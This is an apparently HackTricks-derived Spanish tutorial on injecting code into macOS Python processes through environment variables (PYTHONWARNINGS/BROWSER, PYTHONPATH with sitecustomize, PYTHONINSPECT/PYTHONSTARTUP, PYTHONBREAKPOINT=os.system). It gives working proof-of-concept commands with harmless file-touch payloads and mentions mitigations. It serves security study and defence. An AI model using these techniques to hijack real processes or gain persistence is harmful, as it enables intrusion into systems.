# Inyección en aplicaciones Python de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Mediante las variables de entorno `PYTHONWARNINGS` y `BROWSER`

Si un atacante puede controlar el entorno de un proceso Python, la combinación de `PYTHONWARNINGS` y `BROWSER` puede desencadenar la ejecución de comandos cuando Python importa el módulo `antigravity` mientras procesa una opción de advertencia manipulada. Esta técnica se basa en que `antigravity` abre una URL con el módulo `webbrowser` de Python, que respeta la variable de entorno `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` and `sitecustomize.py`

Durante el inicio normal, el módulo `site` de Python añade rutas específicas del sitio y luego intenta importar un módulo llamado `sitecustomize`. Si coloca primero en `PYTHONPATH` un directorio legible por el atacante, un atacante que controle el entorno del proceso puede hacer que Python importe un payload antes que el script objetivo. La opción `-S` desactiva la inicialización automática de `site`, mientras que el modo aislado (`-I`) ignora `PYTHONPATH` e implica `-s` y `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Para persistencia mediante un sitio de usuario escribible en lugar de un `PYTHONPATH` heredado, consulta [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Mediante `PYTHONINSPECT` y `PYTHONSTARTUP` después de un script

En CPython 3.13+, un script iniciado con `PYTHONINSPECT=1` entra en una sesión interactiva al finalizar. Si la entrada estándar es un terminal y PyREPL está disponible, esa sesión ejecuta el archivo indicado por `PYTHONSTARTUP` **después** del script objetivo y antes del prompt. Por tanto, un atacante que controle ambas variables heredadas y un archivo de inicio legible puede ejecutar código en el proceso objetivo sin modificar su script. Este es un activador posterior al script, no un hook de inicio normal.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

La cadena no ejecuta el archivo de inicio en versiones antiguas de CPython, cuando la entrada estándar no es una terminal o cuando `PYTHON_BASIC_REPL` fuerza el REPL básico. `-E` y `-I` ignoran las variables `PYTHON*`. Comprueba el intérprete y el contexto de terminal reales antes de confiar en esta vía.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Desde Python 3.7 (PEP 553), la función integrada `breakpoint()` importa y llama a lo que indique `sys.breakpointhook`, cuyo destino se obtiene de la variable de entorno **`PYTHONBREAKPOINT`** (`package.module.callable`). Tanto la importación del módulo indicado como la llamada al callable se ejecutan antes de que aparezca normalmente el depurador, por lo que un atacante que controle el entorno de un proceso que llegue a ejecutar `breakpoint()` (algo habitual en scripts de mantenimiento o depuración, y que a veces se deja en rutas de producción) obtiene ejecución de código.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

A diferencia de `PYTHONWARNINGS`/`PYTHONPATH`, esto requiere que el objetivo llegue realmente a una llamada a `breakpoint()`, pero también funciona únicamente mediante los **efectos secundarios de importación** del módulo indicado (apúntalo a cualquier módulo importable —por ejemplo, uno situado primero en `PYTHONPATH`— cuyo código se ejecute en el nivel superior). Establecer `PYTHONBREAKPOINT=0` desactiva por completo el hook.



## References

- [1] [Hacking con variables de entorno - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuración específico del sitio](https://docs.python.org/3/library/site.html)
- [3] [Python: línea de comandos y entorno](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() integrado y PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Despacho de la REPL del intérprete de CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Ejecución del archivo de inicio de PyREPL de CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
